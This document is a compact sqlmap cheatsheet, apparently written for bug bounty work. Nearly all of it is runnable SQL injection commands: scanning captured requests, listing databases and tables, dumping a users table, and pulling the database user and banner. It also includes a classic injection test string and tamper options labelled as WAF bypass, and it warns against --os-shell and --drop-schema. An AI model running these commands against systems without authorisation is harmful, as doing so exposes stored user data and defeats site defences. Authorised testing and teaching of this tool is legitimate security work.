# SQLMap Cheatsheet

## Quick Commands

### 1. Basic Scan
```bash
sqlmap -r request.txt --batch
```

### 2. Get Databases
```bash
sqlmap -r request.txt --batch --dbs
```

### 3. List Tables
```bash
sqlmap -r request.txt --batch -D database_name --tables
```

### 4. Dump Data (Limited)
```bash
sqlmap -r request.txt --batch -D database_name -T users --dump --start=1 --stop=10
```

### 5. Current User/Banner
```bash
sqlmap -r request.txt --batch --current-user --banner
```

## Safe Options for Bug Bounty

```bash
# Always use these
--batch       # No interactive prompts
--level=2     # Standard detection level

# Dangerous - NEVER use in bug bounty
--risk=3      # May cause DoS
--drop-schema # DROPS TABLES
--os-shell    # Full OS access - NEVER
--sql-shell   # Interactive SQL - risky
```

## Request File Format

```
GET /product?id=1 HTTP/1.1
Host: target.com
Cookie: session=abc123
```

## Common Injection Points

| Parameter | Example |
|-----------|---------|
| id=1 | /product?id=1 |
| q=search | /search?q=test |
| user=admin | /profile?user=admin |
| email=test | /reset?email=test |
| id=1' OR '1'='1 | Manual test first |

## Tamper Scripts (WAF Bypass)

```bash
# Space to comment
--tamper=space2comment

# Between (WAF bypass)
--tamper=between

# Multiple
--tamper=space2comment,between,charencode
```

## Detection vs Exploitation

| Goal | Command |
|------|---------|
| Detect | `-r req.txt --batch` |
| Confirm | `-r req.txt --batch --dbs` |
| List tables | `-D db --tables` |
| View columns | `-D db -T users --columns` |
| Dump data | `-D db -T users --dump` |
| Version/User | `--current-user --banner` |